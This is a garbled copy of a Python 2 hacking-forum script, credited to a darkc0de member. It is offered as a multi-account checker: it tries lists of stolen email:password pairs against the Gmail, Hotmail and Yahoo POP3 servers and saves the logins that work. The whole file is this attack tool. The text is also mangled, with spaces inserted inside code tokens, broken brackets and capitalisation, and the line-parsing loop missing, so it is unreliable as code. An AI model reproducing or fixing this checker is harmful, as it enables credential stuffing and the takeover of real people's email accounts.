#! / Usr / bin / python  
#  
# #  
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #  
#. ____________. ___ #  
# __ | _ / ____ _______ | | ______ \ _ \ __ | _ / ____ #  
# / __ | \ __ \ \ ___ \ | / / / ___ \ / / _ \ \ / __ | / __ \ #  
# / / _ / | / __ \ | | \ / <\ \ ___ \ \ _ / \ / / _ / \ ___ / #  
# \ ____ | (______ / __ | | __ | _ \ \ _____> \ _____ / \ _____ | \ ____ \ #  
# \ / \ / \ / #  
# You only get smarter, by playing a smarter opponent! # 
# # ____________________  
# _ / ___ \ ___ \ _ / __ \ \ / \ / / #  
# \ \ ___ | | \ / \ ___ / \ / #  
# \ ___> __ | \ ___> \ / \ _ / #  
# Est.2007 \ / \ / forum.darkc0de.com #  
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #  
# #  
#  
# Code: p47r1ck  
# Name: GHY.py  
# Version 1.0  
#  
# IMPORTANT!!!  
#  
#  
# "You only get smarter  
# By playing a smarter opponent! "  
# By P47r1ck  
#  
# Thanks to: 3l3c7r1c ***91;Happy Now? ***93; 
#  
  
import sys, poplib, os  
os.system (***91;'clear', 'cls'***93; ***91;os.name == 'nt'***93;)  
def printHelp ():  
    print '\ nUsage:. / GHY.py <domain> <emails>'  
    print 'Ex:. / GHY.py yahoo emails.txt'  
    print 'Ex:. / GHY.py gmail emails.txt'  
    print 'Ex:. / GHY.py hotmail emails.txt'  
    Print '\ nNote: The Accounts must be in the following Format: user@mail.com : password \ n ' 
  
print "\ n ********************************************** ********************** "  
print "* Multi Account Checker!!! *"  
print "* Gmail - Hotmail - Yahoo *"  
print "* Coded by P47r1ck! *"  
print "* www.darkc0de.com *"  
print "* 07/2009 *"  
print "************************************************ ******************** "  
  
if len (sys.argv)! = 3:  
    printHelp ()  
    exit (1)  
SAVEFILE = 'valid_emails.txt'  
if sys.argv ***91;1***93; == "hotmail":  
    HOST = 'pop3.live.com'  
    PORT = 995  
    print '\ nChecking Hotmail Account Now \ n'  
else:  
    pass  
if sys.argv ***91;1***93; == "gmail":  
    HOST = 'pop.gmail.com'  
    PORT = 995  
    print '\ nChecking Gmail Account Now \ n'  
else:  
    pass  
if sys.argv ***91;1***93; == "yahoo":  
    HOST = 'plus.pop.mail.yahoo.com'  
    PORT = 995  
    print '\ nChecking Yahoo Account Now \ n'  
  
  
  
# Do not change anything below.  
maillist = sys.argv ***91;2***93;  
valid = ***91;***93;  
currline = 0  
  
try:  
    handle = open (maillist)  
except:  
    print '\ n ***91;-***93; I can not open the mail list.Dude!!! Be carefull!!! ' 
    print '\ n ***91;-***93; Leaving ... Ciao!'  
    exit (1)  
  
    try:  
        pop = poplib.POP3_SSL (HOST, PORT)  
        pop.user (email)  
        pop.pass_ (password)  
        valid.append (email + ':' + password)  
        print '\ n ***91;+***93; Checking:% s <% s> -> Valid! \ n'% (email, password)  
        pop.quit ()  
    except:  
        print '***91;+***93; Checking:% s <% s> -> Invalid!' % (Email, password) 
        pass  
  
print '\ n ***91;+***93; Total Valid:% s'% len (valid)  
print '\ n ***91;+***93; Done. \ n' 
